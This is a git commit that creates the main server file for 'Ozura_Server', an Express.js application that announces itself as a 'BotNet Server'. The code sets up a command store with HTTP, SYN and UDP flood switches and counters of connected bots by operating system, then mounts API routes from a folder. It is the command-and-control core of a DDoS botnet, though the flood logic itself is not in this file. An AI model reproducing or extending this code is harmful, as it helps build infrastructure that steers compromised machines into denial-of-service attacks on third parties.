13f9e2ba21a85e7e9182e280901944b25d7329db
667 <52248252+NaNtheDev@users.noreply.github.com>
2021-03-08 16:42:52 +0100

    Create index.js

---
+++ Ozura_Server/index.js
@@ -0,0 +1,49 @@
+const express = require('express');
+const bodyParser = require('body-parser');
+const { readdir } = require('fs');
+const cors = require('cors')
+const config = require('./config.json');
+const data = require('./src/utils/database');
+
+class Server {
+    server = express()
+    config = config;
+    data = data;
+    constructor({ ip, port }) {
+        if (!this.data.command.has('command')) {
+            this.data.command.set('command', {
+                httpFlood: false,
+                synFlood: false,
+                udpFlood: false
+            });
+            this.data.stats.set('Windows', {
+                count: 0
+            });
+            this.data.stats.set('Linux', {
+                count: 0
+            });
+            this.data.stats.set('Darwin', {
+                count: 0
+            });
+            this.data.stats.set('Java', {
+                count: 0
+            });
+        };
+        this.server.use(cors());
+        this.server.use(bodyParser.urlencoded({ extended: true }));
+        this.server.use(bodyParser.json());
+        this.server.use(bodyParser.raw());
+
+        readdir('./src/routes/', (err, files) => {
+            if (err) return console.log(err);
+            files.forEach(file => {
+                const Routes = require(`./src/routes/${file}`);
+                this.server.use('/api/', new Routes(this));
+            });
+            console.log(`${files.length} routes ready`);
+        });
+        this.server.listen(port, ip, () => console.log(`BotNet Server started on http://${ip}:${port}`))
+    };
+};
+
+new Server({ ip: config.ip, port: config.port})
